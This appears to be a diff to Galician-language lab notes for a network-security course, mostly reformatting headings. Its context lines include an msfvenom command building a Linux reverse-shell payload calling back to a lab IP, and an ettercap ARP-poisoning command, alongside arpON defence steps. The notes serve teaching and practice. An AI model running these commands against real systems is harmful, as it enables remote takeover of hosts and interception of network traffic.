@@ -175,7 +175,7 @@
 
   > Aínda que non teñamos entrono gráfico, os pasos de instalación son iguales (acordarse de meter un nombre e un puerto que sea facil saberse)
 
- ## **Atacante:**
+ ### **Atacante:**
 
   1º) Creamos o payload -> `msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.11.48.135 LPORT=4096 -f elf > payload.bin` .
   
@@ -294,7 +294,7 @@
     [exploit] -> lanza o exploit previamente configurado
     
 
- ## **CLIENTE:**
+ ### **CLIENTE:**
 
  1º) Facemos unha consulta a unha páxina -> `curl http://example.org`
 
@@ -333,23 +333,24 @@
 
 2)Configuramos ruta /etc/arpon.conf. Comentamos todas as lineas que ten o archivo e añadimos a ip-mac do noso compañeiro, do router e a nosa propia (para ver a mac executamos `ifconfig` e na interfaz correspondente  miramos o campo ether):
 
-		10.11.48.135    00:50:56:97:f7:7a
-		10.11.48.1      dc:08:56:10:84:b9
-		10.11.48.118    00:50:56:97:5b:bc
+	10.11.48.135    00:50:56:97:f7:7a
+	10.11.48.1      dc:08:56:10:84:b9
+	10.11.48.118    00:50:56:97:5b:bc
 
-Comprobamos o funcionamento:
+* Comprobamos o funcionamento:
 
-## **ATACANTE:**
+  ### **ATACANTE:**
 
-1)Facemos un arp poisoning -> `ettercap -T -q -i ens33 -M arp:remote //10.11.48.118/ //10.11.48.1/`
+  1)Facemos un arp poisoning -> `ettercap -T -q -i ens33 -M arp:remote //10.11.48.118/ //10.11.48.1/`
 
-## **VÍCTIMA:**
+  ### **VÍCTIMA:**
 
-1)Paramos e maskeamos o servicio de arp@ens33(creo que con parando xa sirve) .
+  1)Paramos e maskeamos o servicio arp@ens33 (creo que con parando xa sirve) .
 
-2)Miramos a tabla de arp -> `arp -a`. Si temos mais ips das que nos interesa borramos a caché arp con `ip -s -s neigh flush all`. Localizamos o gateway e a súa mac ao recibir un arp spoofing ten que ser a do atacante(ten lóxica xa que ao recibir un ataque MITM, quen está no medio é o atacante en vez do router)
+  2)Miramos a tabla de arp -> `arp -a`. Si temos mais ips das que nos interesa borramos a caché arp con `ip -s -s neigh flush all`. Localizamos o gateway e a súa mac ao recibir un arp spoofing ten que ser a do 
+   atacante(ten lóxica xa que ao recibir un ataque MITM, quen está no medio é o atacante en vez do router)
 
-3)Volvemos a activar o servicio apr@ensee, facemos un restart e ahora ao sacar a tabla de arp deberia aparecer xa a mac do gateway xa que o arpON interven
+  3)Volvemos a activar o servicio arp@ens33, facemos un restart e ahora ao sacar a tabla de arp deberia aparecer xa a mac do gateway xa que o arpON interven
 
 
 
